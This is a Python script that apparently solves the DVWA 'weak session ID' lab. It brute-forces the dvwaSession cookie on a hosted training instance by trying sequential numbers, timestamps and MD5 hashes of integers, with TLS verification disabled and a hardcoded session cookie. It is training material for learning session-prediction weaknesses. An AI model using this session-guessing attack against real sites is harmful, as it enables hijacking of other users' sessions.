import requests
import hashlib
import time
import urllib3
urllib3.disable_warnings()

BASE_URL = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/weak_id/"
COOKIES = {
    "PHPSESSID": "ldi9n0nspgemlhdv38su5o9dt3",
    "security": "low",
    "dvwaSession": "7"
}

def test_dvwa_session(dvwa_session_val):
    c = COOKIES.copy()
    c["dvwaSession"] = str(dvwa_session_val)
    resp = requests.get(BASE_URL, cookies=c, timeout=8, verify=False)
    print(f"[-] test dvwaSession={dvwa_session_val} | status={resp.status_code}")
    lines = resp.text.splitlines()
    for line in lines:
        if "dvwaSession" in line or "User ID" in line:
            print("    ", line.strip())
    if "User ID" in resp.text:
        print(f"[+] Valid dvwaSession = {dvwa_session_val}\n")
        return True
    return False


def crack_low(start=1, end=20):
    print("===== Crack LOW (plain number increment) =====")
    for num in range(start, end + 1):
        test_dvwa_session(num)
        time.sleep(0.1)


def crack_medium(base_ts=None, window=100):
    if base_ts is None:
        base_ts = int(time.time())
    print(f"===== Crack MEDIUM base={base_ts}, ±{window} =====")
    for ts in range(base_ts - window, base_ts + window):
        test_dvwa_session(ts)
        time.sleep(0.05)


def crack_high(start=1, end=20):
    print("===== Crack HIGH md5(increment) =====")
    for num in range(start, end + 1):
        md5_val = hashlib.md5(str(num).encode("utf-8")).hexdigest()
        test_dvwa_session(md5_val)
        print(f"    origin num:{num} md5:{md5_val}\n")
        time.sleep(0.1)


if __name__ == "__main__":
    crack_low(start=1, end=10)
    # crack_medium()
    # crack_high()
